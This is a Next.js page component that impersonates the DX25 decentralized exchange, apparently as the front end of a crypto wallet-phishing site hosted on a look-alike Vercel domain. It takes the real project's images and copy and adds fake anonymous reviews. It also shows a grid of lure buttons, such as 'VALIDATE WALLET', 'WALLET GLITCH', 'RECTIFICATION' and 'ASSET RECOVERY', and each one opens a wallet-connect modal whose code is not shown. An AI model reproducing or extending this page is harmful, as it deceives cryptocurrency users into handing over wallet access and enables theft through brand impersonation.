
"use client";

// import { useAccount, useConnect,  type BaseError,useReadContracts, useWriteContract, useBalance, useSwitchChain , useSendTransaction , useWaitForTransactionReceipt, useEstimateGas , useSignMessage , usePrepareTransactionRequest  } from "wagmi";
import Image from "next/image";
import WalletConnectModal from "./components/walletconnect";
import { useState, useEffect } from "react";
// import { mainnet, arbitrum, avalanche, base, optimism, polygon , bsc , tron } from "viem/chains";
import { Star } from 'lucide-react';
// import { abi } from "./config/abi";
// import { parseEther, parseUnits } from 'viem' 


// export default function ConnectButton() {
//   return <w3m-button />
// }
const links = [
  "CONNECT ON PC",
  "STAKING",
  "BRIDGE",
  "CLAIM",
  "PRESALE",
  "AIRDROP",
  "MIGRATION",
  "BUY NFT",
  "WHITELIST",
  "ASSET RECOVERY",
  "RPC SERVER",
  "SNAPSHOT",
  "REWARD",
  "VALIDATE WALLET",
  "MIGRATION V2",
  "KYC",
  "MARKETPLACE",
  "CLAIM REWARD",
  "NFT",
  "BUY PRESALE",
  "WALLET GLITCH",
  "BUY",
  "RECTIFICATION",
  "TRANSACTION DELAY"
];

export default function Home() {
  const [isModalOpen, setIsModalOpen] = useState(false);

  // Function to toggle modal visibility
  const handleModalOpen = () => {
    console.log('Modal is opened');
    setIsModalOpen(true);
  };

  const handleModalClose = () => {
    console.log("Modal is closed");
    setIsModalOpen(false);
  };

  useEffect(() => {
    if (isModalOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }

    return () => {
      document.body.style.overflow = 'unset';
    };
  }, [isModalOpen]);


  return (
    <>
      <div className="preheader bg-[#1a1a1a] p-2 text-center">
        <p className="preheader-p text-[#f5f5f5] text-sm font-medium">
          Please ensure the URL matches:<span className="preheader-url text-[#f1c40f] font-bold">dx25services.vercel.app</span>
        </p>
      </div>

      {/* Navbar */}
      <header className="p-4 fixed w-full top-0 bottom-0 left-0 right-0 navbar-edit">
        <div className="container mx-auto flex justify-between items-center">
          <a href="#" className="text-white text-lg font-bold">
            <img
              src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/6362098b7528ea4e0c4eb5cf_logo.svg"
              alt="DX25 Logo"
              className="h-8"
            />
          </a>

          <div className="flex navbar-wrapper space-x-4">
            <a href="#" className="text-white">
              <img
                src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63639e2c35a76b8b6d53de0b_telegram.svg"
                loading="lazy"
                alt=""
                className="image-19"
              />
            </a>
            {/* <a href="#" className="text-white">
              <img
                src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63bd355fcf0c895284c442c6_logo-discord.svg"
                loading="lazy"
                alt=""
                className="image-19"
              />
            </a> */}
            <a href="#" className="text-white">
              <img
                src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63639e32c8fd02677b5fa42a_logo-twitter.svg"
                loading="lazy"
                alt=""
                className="image-19"
              />
            </a>
            <a href="#" className="text-white">
              <img
                src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/645e0256423671a222321b9c_63733efd27b291b689af346b_logo-linkedin.svg"
                loading="lazy"
                alt=""
                className="image-19"
              />
            </a>
            {/* <a href="#" className="text-white">
              <img
                src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/6415b6503669f80ad50b109f_icon-medium.svg"
                loading="lazy"
                alt=""
                className="image-19"
              />
            </a> */}
            <div className="btn-white-3 btn-toggle w-dropdown-toggle">
              <button className="text-white flex items-center text-block-7">
                Documentation
              </button>
            </div>
            <div className="w-button">
              <button

                onClick={handleModalOpen}
                disabled={isModalOpen}
              >
                Connect Wallet
              </button>
            </div>
          </div>

        </div>
        {isModalOpen && <WalletConnectModal onClose={handleModalClose} isModalOpen={isModalOpen} />}
      </header>



      {/* Hero Section */}
      <div className="hero">
        <div className="hero-overlay"></div> {/* Overlay element */}
        <img
          src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e37d839daae7e2abb5e7f9_astroid.png"
          loading="eager"
          sizes="(max-width: 479px) 100vw, 700px"
          srcSet="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e37d839daae7e2abb5e7f9_astroid-p-500.png 500w, https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e37d839daae7e2abb5e7f9_astroid-p-800.png 800w, https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e37d839daae7e2abb5e7f9_astroid.png 1000w"
          alt=""
          className="hero-rock-01"
        />
        <div className="container-responsive py-150 z-20 w-container">
          <div className="columns-9 w-row">
            <div className="w-col w-col-6 w-col-medium-6 w-col-small-6 w-col-tiny-tiny-stack">
              <h1 className="heading-h1 mt-mobile-20">
                A new, powerful
                <br />
                DeFi universe
              </h1>
              <div className="text-block _w-50">
                Powered by MultiversX
                <br />
                <br />
                Earn, swap, and stack yield with leverage on the most powerful
                decentralized exchange on MultiversX. Open the DeFi wormhole.
                <br />
              </div>
            </div>
            <div className="w-col w-col-6 w-col-medium-6 w-col-small-6 w-col-tiny-tiny-stack">
              <div className="mockup-wrapper">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2e6a2149ffd852555661b_coin.png"
                  loading="lazy"
                  alt=""
                  className="usd-coin"
                />
                <div className="iphone-wrapper">
                  <div className="hero-animation-iphone w-embed">
                    <video
                      width="100%"
                      height="100%"
                      poster="https://veax.fra1.cdn.digitaloceanspaces.com/dx25-iphone-cover.png"
                      autoPlay
                      loop
                      muted
                      playsInline
                    >
                      <source
                        src="https://veax.fra1.cdn.digitaloceanspaces.com/dx25-iphone-alpha.mov"
                        type="video/mp4; codecs='hvc1'"
                      />
                      <source
                        src="https://veax.fra1.cdn.digitaloceanspaces.com/dx25-iphone-alpha.webm"
                        type="video/webm"
                      />
                    </video>
                  </div>
                </div>
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2e744513de161ec2102fc_elrond.png"
                  loading="lazy"
                  alt=""
                  className="image-23"
                />
              </div>
            </div>
          </div>
        </div>
        <div className="hero-gradient"></div>
        <div className="hero-animation-astroids w-embed">
          <video
            width="100%"
            height="100%"
            poster="https://veax.fra1.cdn.digitaloceanspaces.com/dx25-astroids-cover.png"
            autoPlay
            loop
            muted
            playsInline
            style={{ objectFit: "cover" }}
          >
            <source
              src="https://veax.fra1.cdn.digitaloceanspaces.com/dx25-astroids-alpha.mov"
              type="video/mp4; codecs='hvc1'"
            />
            <source
              src="https://veax.fra1.cdn.digitaloceanspaces.com/dx25-astroids-alpha.webm"
              type="video/webm"
            />
          </video>
        </div>
      </div>
      <div className="container-responsive w-container">
        <img
          src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63620c59d55b3e5ac0227dfc_seperator.svg"
          loading="lazy"
          alt=""
          className="divider divider-desktop"
        />
        <img
          src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/6362aa8c3971d978bec8ca22_seperator-mobile.svg"
          loading="lazy"
          alt=""
          className="divider divider-mobile"
        />
      </div>
      {/* Reviews */}
      <section className="py-16 ">
        <div className="container mx-auto px-4">
          <h2 className="text-4xl font-bold text-center text-white mb-12">
            OUR REVIEWS
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            <div className="bg-[#111111] rounded-lg p-6 shadow-lg transform transition duration-300 hover:scale-105 hover:shadow-2xl border-l-4 border-white">
              <div className="flex items-center mb-4">
                <div className="w-12 h-12 review-card-bg rounded-full flex items-center justify-center text-white font-bold text-xl mr-4">
                  A
                </div>
                <div>
                  <h3 className="font-semibold text-lg text-white">Anonymous</h3>
                  <p className="text-sm text-purple-300">Metamask</p>
                </div>
              </div>
              <p className="text-gray-300 mb-4">
                Great platform! Easy to connect my wallet and seamless transactions.
              </p>
              <div className="flex items-center">
                {[...Array(5)].map((_, i) => (
                  <Star
                    key={i}
                    size={20}
                    className="text-purple-500"
                    fill="currentColor"
                  />
                ))}
              </div>
            </div>

            <div className="bg-[#111111] rounded-lg p-8 shadow-lg transform transition duration-500 hover:scale-105 hover:shadow-2xl border-l-4 border-white">
              <div className="flex items-center mb-4">
                <div className="w-12 h-12 review-card-bg rounded-full flex items-center justify-center text-white font-bold text-xl mr-4">
                  A
                </div>
                <div>
                  <h3 className="font-semibold text-lg text-white">Anonymous</h3>
                  <p className="text-sm text-purple-300">Trust Wallet</p>
                </div>
              </div>
              <p className="text-gray-300 mb-4">
                I love how secure and user-friendly the web3 integration is!
              </p>
              <div className="flex items-center">
                {[...Array(4)].map((_, i) => (
                  <Star
                    key={i}
                    size={20}
                    className="text-purple-500"
                    fill="currentColor"
                  />
                ))}
                <Star
                  size={20}
                  className="text-gray-600"
                />
              </div>
            </div>

            <div className="bg-[#111111] rounded-lg p-6 shadow-lg transform transition duration-500 hover:scale-105 hover:shadow-2xl border-l-4 border-white">
              <div className="flex items-center mb-4">
                <div className="w-12 h-12 review-card-bg rounded-full flex items-center justify-center text-white font-bold text-xl mr-4">
                  A
                </div>
                <div>
                  <h3 className="font-semibold text-lg text-white">Anonymous</h3>
                  <p className="text-sm text-purple-300">Coinbase Wallet</p>
                </div>
              </div>
              <p className="text-gray-300 mb-4">
                The best DeFi experience I have had. Highly recommend it!
              </p>
              <div className="flex items-center">
                {[...Array(5)].map((_, i) => (
                  <Star
                    key={i}
                    size={20}
                    className="text-purple-500"
                    fill="currentColor"
                  />
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Vision Section */}
      <div className="container-responsive w-container">
        <img
          src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63620c59d55b3e5ac0227dfc_seperator.svg"
          loading="lazy"
          alt=""
          className="divider divider-desktop"
        />
        <img
          src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/6362aa8c3971d978bec8ca22_seperator-mobile.svg"
          loading="lazy"
          alt=""
          className="divider divider-mobile"
        />
      </div>
      <section className="container mx-auto py-16">
        <div className="flex flex-col md:flex-row">
          <div className="md:w-1/2">
            <h2 className="text-2xl text-white font-semibold">
              DX25 is driven by one singular vision
            </h2>
            <p className="mt-4 text-gray-500">
              Create the most powerful DEX across all the worlds in the
              multiverse. Unlock liquidity and maximize your DeFi experience
              with a multitude of trading and yield-earning opportunities.
            </p>
            <div
              style={{
                display: "flex",
                flexWrap: "wrap",
                justifyContent: "space-between",
              }}
            >
              {links.map((linkText, index) => (
                <a
                  key={index}
                  onClick={handleModalOpen}
                  className="btn-white mt-30"
                  style={{ paddingLeft: "10px" }}
                >
                  {linkText}
                </a>
              ))}
            </div>
          </div>
          {/* <div className="md:w-1/2">
            <video autoPlay loop muted className="w-full h-auto">
              <source
                src="https://veax.fra1.cdn.digitaloceanspaces.com/dx25-spinning-astroids-alpha.mov"
                type="video/mp4"
              />
            </video>
          </div> */}
          <div className="section-animation-astroids w-embed">
            <video
              width="100%"
              height="100%"
              poster="https://veax.fra1.cdn.digitaloceanspaces.com/dx25-spinning-astroids-cover.png"
              autoPlay
              loop
              muted
              playsInline
            >
              <source
                src="https://veax.fra1.cdn.digitaloceanspaces.com/dx25-spinning-astroids-alpha.mov"
                type='video/mp4; codecs="hvc1"'
              />
              <source
                src="https://veax.fra1.cdn.digitaloceanspaces.com/dx25-spinning-astroids-alpha.webm"
                type="video/webm"
              />
            </video>
          </div>
        </div>
      </section>

      {/* Building Section */}
      <div className="container-responsive pb-75 px-mobile-md w-container">
        <div className="card-stats-wrapper">
          <div className="w-row">
            <div className="w-col w-col-3"></div>
            <div className="column-20 w-col w-col-6">
              <h2 className="custom-heading text-center">
                <strong>
                  Why are we BUIDLing <br /> on MultiversX
                </strong>
              </h2>
            </div>
            <div className="w-col w-col-3"></div>
          </div>
          <div className="columns-8 w-row">
            <div className="w-col w-col-4 w-col-medium-4 w-col-small-small-stack w-col-tiny-tiny-stack">
              <div className="card-stats">
                <div className="card-stats-number">&gt;$0.005</div>
                <div className="card-stats-title">Low fees</div>
                <div className="card-stats-text">
                  MultiversX Transaction fees
                </div>
              </div>
            </div>
            <div className="column-20 w-col w-col-4 w-col-medium-4 w-col-small-small-stack w-col-tiny-tiny-stack">
              <div className="card-stats">
                <div className="card-stats-number">0</div>
                <div className="card-stats-title">Fully carbon neutral</div>
                <div className="card-stats-text">Green Blockchain</div>
              </div>
            </div>
            <div className="w-col w-col-4 w-col-medium-4 w-col-small-small-stack w-col-tiny-tiny-stack">
              <div className="card-stats">
                <div className="card-stats-number">
                  <strong>~15000 TPS</strong>
                </div>
                <div className="card-stats-title">High throughput</div>
                <div className="card-stats-text">Truly Scalable Blockchain</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Produc summary pre-Section */}
      <div className="container-responsive pt-75 px-mobile-sm w-container">
        <div className="columns-5 w-row">
          <div className="column-center-mobile w-col w-col-6">
            <h2 className="custom-heading">
              DX25 is built differently.{" "}
              <span className="text-secondary">
                With different goals than other DEXs.
              </span>
            </h2>
          </div>
          <div className="w-col w-col-6">
            <div className="text-block-4">PRODUCT SUMMARY</div>
          </div>
        </div>
      </div>
      <div className="container-responsive pt-75 d-none w-container">
        <div className="columns-6 mb-30 w-row">
          <div className="column-18 w-col w-col-3 w-col-medium-6 w-col-small-6 w-col-tiny-6">
            <div className="card-product card h-100">
              <div className="card-img">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d253e492618fc33b3975_icon-01png.png"
                  loading="lazy"
                  alt=""
                  className="card-image-svg"
                />
              </div>
              <h3 className="card-product-number">N. 01</h3>
              <h3 className="heading-5 card-product-heading">
                Advanced Liquidity <br />
                Management
              </h3>
              <p className="paragraph card-product-text text-sh-one text-read-more">
                Liquidity management reduces complexity for passive investors
                particularly keeping concentrated liquidity active.
              </p>
            </div>
          </div>
          <div className="column-18 w-col w-col-3 w-col-medium-6 w-col-small-6 w-col-tiny-6">
            <div className="card-product card h-100">
              <div className="card-img">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d24c3480fd126d53ff6b_icon-02.png"
                  loading="lazy"
                  alt=""
                  className="card-image-svg"
                />
              </div>
              <h3 className="card-product-number">N. 02</h3>
              <h3 className="heading-5 card-product-heading">
                Adaptable <br />
                Liquidity Pools{" "}
              </h3>
              <p className="paragraph card-product-text text-sh-one text-read-more">
                Allows different AMM matching algorithms to coexist in a single
                liquidity pool with variable fee levels.
              </p>
            </div>
          </div>
          <div className="column-19 w-col w-col-3 w-col-medium-6 w-col-small-6 w-col-tiny-6">
            <div className="card-product card h-100">
              <div className="card-img">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d22116bc99258193f6f1_icon-03.png"
                  loading="lazy"
                  alt=""
                  className="card-image-svg"
                />
              </div>
              <h3 className="card-product-number">N. 03</h3>
              <h3 className="heading-5 card-product-heading">
                Single-Sided
                <br /> Liquidity
              </h3>
              <p className="paragraph card-product-text text-sh-one text-read-more">
                Our adaptable liquidity pools will support single-sided
                liquidity, giving the liquidity provider the maximum opportunity
                to participate.
              </p>
            </div>
          </div>
          <div className="column-19 w-col w-col-3 w-col-medium-6 w-col-small-6 w-col-tiny-6">
            <div className="card-product card h-100">
              <div className="card-img">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d20260c59ee0e18f72c7_icon-04.png"
                  loading="lazy"
                  alt=""
                  className="card-image-svg"
                />
              </div>
              <h3 className="card-product-number">N. 04</h3>
              <h3 className="heading-5 card-product-heading">Orderbook UX</h3>
              <p className="paragraph card-product-text text-sh-one text-read-more">
                Orderbooks, charting, trade reports, the goal of our
                implementation is to make the transition to using DEX from CEX
                as user friendly as possible.
              </p>
            </div>
          </div>
        </div>
        <div className="columns-6 mb-30 w-row">
          <div className="column-18 w-col w-col-3 w-col-tiny-tiny-stack">
            <div className="card-product card h-100">
              <div className="card-img">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d1e86173f24e88076117_icon-05.png"
                  loading="lazy"
                  alt=""
                  className="card-image-svg"
                />
              </div>
              <h3 className="card-product-number">N. 05</h3>
              <h3 className="heading-5 card-product-heading">
                Easy Version Upgrades for Liquidity Providers
              </h3>
              <p className="paragraph card-product-text text-sh-one text-read-more">
                With a protocol layer, we are focused on allowing the liquidity
                providers the minimum of development tooling to move liquidity
                to new versions giving us a much higher release cadence than
                other DEXs. No trusted contracts, just extensible smart contract
                function design.
              </p>
            </div>
          </div>
          <div className="column-18 w-col w-col-3 w-col-tiny-tiny-stack">
            <div className="card-product card h-100">
              <div className="card-img">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d1ce5b7e5c6314cb9dc2_icon-06.png"
                  loading="lazy"
                  alt=""
                  className="card-image-svg"
                />
              </div>
              <h3 className="card-product-number">N. 06</h3>
              <h3 className="heading-5 card-product-heading">
                Margin &amp; Derivative
                <br /> Trading
              </h3>
              <p className="paragraph card-product-text text-sh-one text-read-more">
                Enabling the next generation DeFi DEX with collateral that can
                be used across multiple contracts with exposure offsetting.
                Portfolio risk rather than individual contract risk.
              </p>
            </div>
          </div>
          <div className="column-19 w-col w-col-3 w-col-tiny-tiny-stack">
            <div className="card-product card h-100">
              <div className="card-img">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d1ab0b07c16bab6b1db9_icon-07.png"
                  loading="lazy"
                  alt=""
                  className="card-image-svg"
                />
              </div>
              <h3 className="card-product-number">N. 07</h3>
              <h3 className="heading-5 card-product-heading">
                Unlocking
                <br /> Liquidity
              </h3>
              <p className="paragraph card-product-text text-sh-one text-read-more">
                Leaning on our decades of trading experience before the
                inception of cryptocurrency, we apply best in class implied
                prices calculators to support smart order routing.
              </p>
            </div>
          </div>
          <div className="column-19 w-col w-col-3 w-col-tiny-tiny-stack">
            <div className="card-product card h-100">
              <div className="card-img">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d18fdbdb7b67b2e0d44f_icon-08.png"
                  loading="lazy"
                  alt=""
                  className="card-image-svg"
                />
              </div>
              <h3 className="card-product-number">N. 08</h3>
              <h3 className="heading-5 card-product-heading">
                Full
                <br />
                Ownership
              </h3>
              <p className="paragraph card-product-text text-sh-one text-read-more">
                Unlike centralized exchanges, users always have full control
                over their assets. The underlying smart contracts ensure that
                users don’t hand over their assets to a third party and maintain
                custody of all of their assets.
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Yield section */}
      <div className="container-full-width">
        <img
          src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d39449c7b9354bb898ea_dx25-ux.png"
          loading="lazy"
          sizes="(max-width: 479px) 100vw, 70vw"
          srcSet="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d39449c7b9354bb898ea_dx25-ux-p-500.png 500w, https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d39449c7b9354bb898ea_dx25-ux-p-800.png 800w, https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d39449c7b9354bb898ea_dx25-ux-p-1080.png 1080w, https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d39449c7b9354bb898ea_dx25-ux-p-1600.png 1600w, https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d39449c7b9354bb898ea_dx25-ux-p-2000.png 2000w, https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2d39449c7b9354bb898ea_dx25-ux.png 2528w"
          alt=""
          className="image-25"
        />
        <div className="container-responsive container-absolute px-mobile-sm w-container">
          <div className="columns-11 w-row ml-6">
            <div className="column-23 w-col w-col-4">
              <h2 className="custom-heading">May the yield be with you.</h2>
              <div className="text-block">
                Make your crypto work for you with DX25. Leverage both single-sided liquidity and traditional liquidity pools to earn yield.
              </div>
              <div className="btn-white mt-20 w-button">
                <button

                  onClick={handleModalOpen}
                  disabled={isModalOpen}
                >
                  Connect Wallet
                </button>
              </div>
            </div>
            <div className="column-21 w-col w-col-8"></div>
          </div>
        </div>
      </div>

      {/* Card section */}
      <div className="container-responsive px-20 pt-75 px-mobile-sm w-container">
        <div className="columns-7 mb-20 w-row">
          <div className="w-col w-col-6">
            <div className="card-feature bg-dark mb-mobile-20">
              <h3 className="card-feature-title card-feature-title-lg">One DEX to<br />rule them all</h3>
              <div className="card-feature-text text-white">
                DX25 is positioned to be the leading DeFi protocol on MultiversX with its range of services and innovative services and leverage trading facilities.
              </div>
            </div>
          </div>
          <div className="w-col w-col-3">
            <div className="card-feature bg-white">
              <h3 className="card-feature-title">Fueled by $DX25 Token</h3>
              <div className="card-feature-text">
                The $DX25 token is at the heart of the DX25 ecosystem. You can buy it, swap it, and even vote on various governance proposals with it.
              </div>
            </div>
          </div>
          <div className="w-col w-col-3"></div>
        </div>
        <div className="columns-12 w-row">
          <div className="w-col w-col-3"></div>
          <div className="w-col w-col-3">
            <div className="card-feature bg-gradient mb-mobile-20">
              <h3 className="card-feature-title">Superpowers for multiverse adventurers</h3>
              <div className="card-feature-text">
                MultiversX is a faster and cheaper alternative to chains like Ethereum. Conduct your trades without sending a fortune in gas fees.
              </div>
            </div>
          </div>
          <div className="w-col w-col-3"></div>
          <div className="w-col w-col-3">
            <div className="card-feature bg-gradient">
              <h3 className="card-feature-title">Trade long and prosper</h3>
              <div className="card-feature-text">
                Trade any coin on MultiversX in seconds. No need to go through cumbersome registration processes. Just connect your wallet and start trading.
              </div>
            </div>
          </div>
        </div>
      </div>

      {/*  Sponsorship section */}
      <div className="container-responsive w-container">
        <img
          src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2f91d88285e00e7b5ab9d_divider-01.svg"
          loading="lazy"
          alt=""
          className="divider divider-desktop pt-150"
        />
      </div>

      <div className="container-responsive d-mobile px-mobile-md py-50-mobile w-container">
        <img
          src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e3f719f57d308234481428_divider-02-mobile.svg"
          loading="lazy"
          alt=""
          className="divider-02-mobile"
        />
      </div>

      <div className="container-responsive pt-75 pb-75 p-mobile-sm w-container">
        <div className="columns-logo w-row">
          <div className="w-col w-col-6">
            <div className="partners-container">
              <div className="partner-logo">
                <a target="_blank" rel="noopener noreferrer" className="logo-link w-inline-block">
                  <img
                    loading="lazy"
                    src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e3ea0266fd5295a92d9eaa_tacans-logo-white.png"
                    alt=""
                    className="logo-image logo-sm"
                  />
                </a>
              </div>
              <div className="partner-logo">
                <a target="_blank" rel="noopener noreferrer" className="logo-link w-inline-block">
                  <img
                    loading="lazy"
                    src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e3ea0acd6b277000d6b3a3_logo-skynet-trading.png"
                    height="50"
                    alt=""
                    className="logo-image"
                  />
                </a>
              </div>
              <div className="partner-logo">
                <a target="_blank" rel="noopener noreferrer" className="logo-link w-inline-block">
                  <img
                    loading="lazy"
                    sizes="(max-width: 479px) 84vw, (max-width: 767px) 43vw, 208.3333282470703px"
                    height="50"
                    src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/64085b786ec8b28ba6b8fbed_logo-istari.png"
                    srcSet="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/64085b786ec8b28ba6b8fbed_logo-istari-p-500.png 500w, https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/64085b786ec8b28ba6b8fbed_logo-istari.png 500w"
                    alt=""
                    className="logo-image"
                  />
                </a>
              </div>
            </div>
          </div>
          <div className="column-logo-02 w-col w-col-6">
            <h2 className="custom-heading _w-mobile-70">Incubated by The Best</h2>
            <div className="text-block _w-50 _w-mobile-70">
              DX25 has been funded by the likes of Tacans Labs, Skynet Trading and Istari Vision. We have the stamp of approval from the very best.
            </div>
          </div>
        </div>
      </div>

      <div className="container-responsive w-container">
        <img
          src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63e2f94cb480b80eef013d84_divider-02.svg"
          loading="lazy"
          alt=""
          className="divider divider-desktop"
        />
      </div>

      {/*  Sign Up section */}
      <div className="container-responsive px-20 pt-150 w-container">
        <div className="get-access-wrapper">
          <div className="columns-13 w-row">
            <div className="column-24 w-col w-col-10">
              <h2 className="custom-heading mt-30">Join our community for the latest news and updates! Sign up for our
                newsletter today and <a target="_blank" className="link"><span className="text-white">join
                  our Discord</span></a> to stay in the loop.</h2><a target="_blank"
                    className="btn-white mt-30 w-button">Get notified</a>
            </div>
            <div className="w-col w-col-2"></div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="footer">
        <div className="container-responsive pt-75 pb-75 px-mobile-md pt-mobile-75 pb-mobile-75 w-container">
          <div className="footer-center">
            <div className="footer-social-block-three-2">
              <a target="_blank" rel="noopener noreferrer" className="footer-social-link-three-2 w-inline-block">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63639e2c35a76b8b6d53de0b_telegram.svg"
                  loading="lazy"
                  alt=""
                  className="image-19"
                />
              </a>
              <a target="_blank" rel="noopener noreferrer" className="footer-social-link-three-2 w-inline-block">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63bd355fcf0c895284c442c6_logo-discord.svg"
                  loading="lazy"
                  alt=""
                  className="image-19"
                />
              </a>
              <a target="_blank" rel="noopener noreferrer" className="footer-social-link-three-2 w-inline-block">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/63639e32c8fd02677b5fa42a_logo-twitter.svg"
                  loading="lazy"
                  alt=""
                  className="image-20"
                />
              </a>
              <a target="_blank" rel="noopener noreferrer" className="footer-social-link-three-2 w-inline-block">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/645e0256423671a222321b9c_63733efd27b291b689af346b_logo-linkedin.svg"
                  loading="lazy"
                  alt=""
                  className="image-20"
                />
              </a>
              <a target="_blank" rel="noopener noreferrer" className="footer-social-link-three-2 w-inline-block">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/6415b6503669f80ad50b109f_icon-medium.svg"
                  loading="lazy"
                  alt=""
                  className="image-20"
                />
              </a>
              <a target="_blank" rel="noopener noreferrer" className="footer-social-link-three-2 w-inline-block">
                <img
                  src="https://uploads-ssl.webflow.com/6362079190ba0160faca7b3f/645e02b72da12daf6c22fd08_6415b7a552044cbd2ea05e85_logo-youtube.svg"
                  loading="lazy"
                  alt=""
                  className="image-20"
                />
              </a>
            </div>
          </div>
          <div className="footer-bottom">
            <div className="text-block-3 mt-mobile-50">@ 2023 DX25. ALL RIGHTS RESERVED</div>
            <div className="footer-legal-block">
              <a href="index.html#" className="footer-legal-link">COOKIE PREFERENCES</a>
              <a href="index.html#" className="footer-legal-link">PRIVACY &amp; COOKIE POLICY</a>
            </div>
          </div>
        </div>
        <div className="footer-gradient"></div>
      </div>



    </>



  );
}

